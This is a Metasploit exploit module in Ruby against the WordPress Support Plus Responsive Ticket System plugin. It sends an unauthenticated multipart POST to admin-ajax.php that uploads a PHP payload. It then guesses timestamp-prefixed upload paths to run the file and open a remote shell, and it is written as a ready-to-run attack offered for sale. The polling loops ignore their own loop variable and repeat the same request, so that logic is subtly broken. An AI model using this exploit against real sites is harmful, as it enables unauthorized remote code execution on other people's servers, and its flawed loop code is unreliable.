##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Wordpress Support Plus Responsive Ticket System Unauthenticated RCE',
      'Description' => %q{
    This module exploits an unauthenticated remote code execution vulnerability in certains versions of the Wordpress Support Plus Responsive Ticket System plugin.

    Wordpress Support Plus Responsive Ticket System is a popular plugin that enables a ticketing and support feature
    in the popular Wordpress CMS. This module attempts to exploit an unauthenticated upload mechanism in order to
    upload a remote shell.

    Categories: Open Source, Wordpress

    Price: 7

    Video: https://asciinema.org/a/HFT57w2zmnjDQC4wKTFfhGEz4

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
         OptString.new('TARGETURI', [ true, "Base Wordpress directory path", '/wordpress/']),
      ], self.class)
  end

  def exploit
    filename = Rex::Text.rand_text_alpha(8) + '.php4'
    data = Rex::MIME::Message.new
    data.add_part('wpsp_upload_attachment', nil, nil, 'form-data; name="action"')
    data.add_part('<?php ' + payload.encoded + ' ?>', 'application/octet-stream', nil, 'form-data; name="0"; filename="'+filename+'"')

    now = Time.now.to_i

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'method' => 'POST',
      'data' => data.to_s,
      'ctype' => "multipart/form-data;charset=UTF-8;boundary=#{data.bound}",
    })

    i = 0

    @shelled = false
    while i <= 60 and !@shelled
      i.upto (i+10) do
        vprint_status "Getting " + normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wpsp', (now + i).to_s + "_#{filename}")
        break if @shelled
        send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wpsp', (now + i).to_s + "_#{filename}")
        })
      end
      (i*-1).downto((i*-1)-10) do
        vprint_status "Getting " + normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wpsp', (now + i).to_s + "_#{filename}")
        break if @shelled
        send_request_cgi({
          'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wpsp', (now + i).to_s + "_#{filename}")
        })
      end
      i = i + 10
    end

  end

  def on_new_session(client)
    @shelled = true
  end
end
